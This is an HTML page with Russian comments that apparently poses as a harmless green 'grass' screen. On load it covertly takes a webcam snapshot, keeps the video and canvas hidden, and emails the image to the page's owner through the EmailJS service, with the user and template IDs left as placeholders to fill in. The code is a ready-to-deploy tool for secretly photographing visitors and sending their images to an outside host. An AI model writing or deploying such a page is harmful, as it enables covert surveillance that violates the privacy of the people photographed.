<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Авто фото</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background-color: green; /* зелёная трава */
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
  <script>
    emailjs.init("ТВОЙ_USER_ID");

    function sendPhoto(photoUrl) {
      emailjs.send('service_zv13ydk', 'ТВОЙ_TEMPLATE_ID', {
        time: new Date().toLocaleString(),
        photo_link: photoUrl
      })
      .then(response => console.log('Письмо отправлено!'))
      .catch(error => console.error('Ошибка отправки:', error));
    }

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        // Ждём, пока видео реально готово
        video.onloadedmetadata = () => {
          video.play();

          // Устанавливаем canvas размером с видео
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;

          // Делаем фото через небольшую задержку
          setTimeout(() => {
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL('image/png');
            console.log('Фото сделано:', photoData);

            sendPhoto(photoData); // отправка на EmailJS
          }, 500); // 0.5 секунды
        };
      })
      .catch(err => {
        alert("Ошибка доступа к камере: " + err.message);
      });
  </script>
</body>
</html>
